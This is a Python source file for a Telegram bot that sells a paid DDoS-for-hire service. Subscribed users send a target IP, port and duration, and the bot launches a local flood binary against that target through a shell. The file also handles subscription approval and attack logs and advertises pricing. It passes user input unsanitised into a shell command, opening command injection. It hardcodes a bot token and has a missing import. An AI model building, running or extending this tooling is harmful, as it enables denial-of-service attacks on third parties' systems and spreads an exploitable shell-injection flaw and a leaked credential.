import os
import subprocess
import threading
import json
from datetime import datetime, timedelta
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackContext

admins = [1927767033]
approved_users = {}
attack_history = {}
active_attacks = {}
if os.path.exists("approved_users.json"):
    with open("approved_users.json", "r") as f:
        approved_users = json.load(f)

if os.path.exists("attack_history.json"):
    with open("attack_history.json", "r") as f:
        attack_history = json.load(f)

def save_data():
    with open("approved_users.json", "w") as f:
        json.dump(approved_users, f)
    with open("attack_history.json", "w") as f:
        json.dump(attack_history, f)

def start(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id in approved_users:
        update.message.reply_text("🎊WELCOME BRO WORLD'S\n BEAST SERVER HACKS BOT🤖HEAR\n\nTHANKS FOR PURCHASING MY DDOS SERVICE YOU Will NOT BE DESPONDENT USING THIS BOT💯\n try to some cmd\n /attack or /help ")
    else:
        update.message.reply_text("🚫 ACESS DENIED BRO YOUR PLAN EXPERIED OR INVALID❗\nGET ACCESS DM TO ADMIN OR OWNER\n👤OWNER => @GOKU_VAMPIRE🚀\n👤 ADMIN INFORMATION NOT AVAILABLE\n\n♻️ REBRANDING ☢️DDOS BOT☢️ AVAILABLE 2000 MONTH SEASON 3500 FIX ✅ INTERSTATE ADMIN DM @GOKU_VAMPIRE 🚀 ")

def help_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id in approved_users:
        update.message.reply_text("🚀 CORECT ✅ formet:\n/attack 20.204.16.154 12665 180")
    else:
        update.message.reply_text("🚫 ACESS DENIED BRO YOUR PLAN EXPERTS OR INVALID❗")

def approve(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("😌BHAI TU ADMIN NHI HE PEHLE ADMIN BN JA FIR ORDER DENA👊.")
        return

    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        approved_users[target_id] = {
            "approved_date": str(datetime.now()),
            "expires_on": str(datetime.now() + timedelta(days=days))
        }
        save_data()
        update.message.reply_text(f"User {target_id} approved for {days} days.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /approve <user_id> <days>")

def disapprove(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("😌BHAI TU ADMIN NHI HE PEHLE ADMIN BN JA FIR ORDER DENA👊.")
        return

    try:
        target_id = int(context.args[0])
        if target_id in approved_users:
            del approved_users[target_id]
            save_data()
            update.message.reply_text(f"User {target_id} has been disapproved.")
        else:
            update.message.reply_text("User is not approved.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /disapprove <user_id>")

def list_approved(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("😌BHAI TU ADMIN NHI HE PEHLE ADMIN BN JA FIR ORDER DENA👊.")
        return

    if approved_users:
        message = "Approved Users:\n"
        for uid, data in approved_users.items():
            days_left = (datetime.strptime(data['expires_on'], "%Y-%m-%d %H:%M:%S.%f") - datetime.now()).days
            message += f"User ID: {uid}, Days Left: {days_left}\n"
        update.message.reply_text(message)
    else:
        update.message.reply_text("No approved users.")

def attack(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in approved_users:
        update.message.reply_text("🚫 ACESS DENIED BRO YOUR PLAN EXPERDor INVALID ❗\nGET ACCESS DM TO ADMIN OR OWNER\n👤 OWNER => @GOKU_VAMPIRE\n👤 ADMIN INFORMATION NOT AVAILABLE\n\n♻️ REBRANDING ☢️DDOS BOT☢️ AVAILABLE 2000 MONTH SEASON 3500 fixx✅ INTERSTATE ADMIN DM @GOKU_VAMPIRE")
        return

    try:
        ip = context.args[0]
        port = context.args[1]
        duration = int(context.args[2])

        # Notify attack started
        update.message.reply_text(f"🚀YOUR ATTACK ON THE WAY🚀\n\n♐IP: {ip}\n♐PORT: {port}\n⌚TIME: {duration} \n\n ⭕KEEP WAITING♻️...............♻️\n\n🚀 ATTACK POWERD BY @GOKU_VAMPIRE✅")

        command = f"./attack{ip} {port} {duration} 10"
        process = subprocess.Popen(command, shell=True)

        attack_history.setdefault(str(user_id), []).append({"ip": ip, "port": port, "time": duration, "start_time": str(datetime.now())})
        save_data()


        def end_attack():
            process.kill()
            update.message.reply_text(f"\n🎊COMPLETED............✅\n🚀IP: {ip}\n🚀PORT: {port}\n🚀TIME: {duration}\n\n♻️ TRY TO NEXT ATTACK (press and hold)👇\n                 /attack")
        
        timer = threading.Timer(duration, end_attack)
        timer.start()
        
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /attack <ip> <port> <time>")

def show_attacks(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("😌BHAI TU ADMIN NHI HE PEHLE ADMIN BN JA FIR ORDER DENA👊.")
        return

    message = "Attack History (Last 24 hours):\n"
    now = datetime.now()
    for uid, attacks in attack_history.items():
        attacks_in_24h = [a for a in attacks if (now - datetime.strptime(a['start_time'], "%Y-%m-%d %H:%M:%S.%f")).total_seconds() < 86400]
        message += f"User ID: {uid}, Number of Attacks: {len(attacks_in_24h)}\n"
    
    update.message.reply_text(message)

def restart(update: Update, context: CallbackContext) -> None:
    os.execl(sys.executable, sys.executable, *sys.argv)

def main():

    updater = Updater("7268885811:AAGLjxi7LGAHryZzsnBt5bQy4sPJQRdMGfo", use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(CommandHandler("approve", approve))
    dispatcher.add_handler(CommandHandler("disapprove", disapprove))
    dispatcher.add_handler(CommandHandler("list", list_approved))
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(CommandHandler("show_attack", show_attacks))
    dispatcher.add_handler(CommandHandler("restart", restart))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()